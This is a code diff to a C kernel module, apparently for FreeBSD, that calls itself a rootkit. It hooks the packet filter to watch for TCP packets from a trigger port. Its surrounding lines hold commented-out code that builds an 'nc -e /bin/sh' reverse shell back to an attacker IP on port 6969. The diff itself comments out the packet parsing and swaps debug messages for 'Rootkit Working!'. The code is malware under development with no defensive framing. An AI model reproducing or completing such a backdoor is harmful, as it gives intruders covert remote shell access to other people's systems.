@@ -26,34 +26,34 @@
 static struct pfil_hook *my_hook;
 
 static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
-    struct mbuf *m = *mp;
-    struct ip *ip_header;
-    struct tcphdr *tcp_header;
+    // struct mbuf *m = *mp;
+    // struct ip *ip_header;
+    // struct tcphdr *tcp_header;
 
-    // Ensure mbuf is valid
-    if (m == NULL) return PFIL_PASS;;
+    // // Ensure mbuf is valid
+    // if (m == NULL) return PFIL_PASS;;
 
-    // Make sure the packet has enough data for an IP header
-    if (m->m_len < sizeof(struct ip)) {
-        m = m_pullup(m, sizeof(struct ip));
-        if (m == NULL) return PFIL_PASS;;
-    }
+    // // Make sure the packet has enough data for an IP header
+    // if (m->m_len < sizeof(struct ip)) {
+    //     m = m_pullup(m, sizeof(struct ip));
+    //     if (m == NULL) return PFIL_PASS;;
+    // }
    
-    // Extract the IP header
-    ip_header = mtod(m, struct ip *);
-    // Check if it's a TCP packet
-    if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
+    // // Extract the IP header
+    // ip_header = mtod(m, struct ip *);
+    // // Check if it's a TCP packet
+    // if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
 
-    // Extract the TCP header
-    tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
-    // Check source port
-    if (ntohs(tcp_header->th_sport) != TRIGGER_PORT) return PFIL_PASS;;
+    // // Extract the TCP header
+    // tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
+    // // Check source port
+    // if (ntohs(tcp_header->th_sport) != TRIGGER_PORT) return PFIL_PASS;;
 
-    // Ensure there's enough data for TCP header
-    if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
-        m = m_pullup(m, (ip_header->ip_hl << 2) + sizeof(struct tcphdr));
-        if (m == NULL) return PFIL_PASS;;
-    }
+    // // Ensure there's enough data for TCP header
+    // if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
+    //     m = m_pullup(m, (ip_header->ip_hl << 2) + sizeof(struct tcphdr));
+    //     if (m == NULL) return PFIL_PASS;;
+    // }
 
 
 
@@ -71,9 +71,9 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
     //snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
        // "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
 
-    printf("The reverse shell command is\n");
-    printf("The reverse shell command is\n");
-    printf("The reverse shell command is\n");
+    printf("Rootkit Working!\n");
+    printf("Rootkit Working!\n");
+    printf("Rootkit Working!\n");
     //printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
     
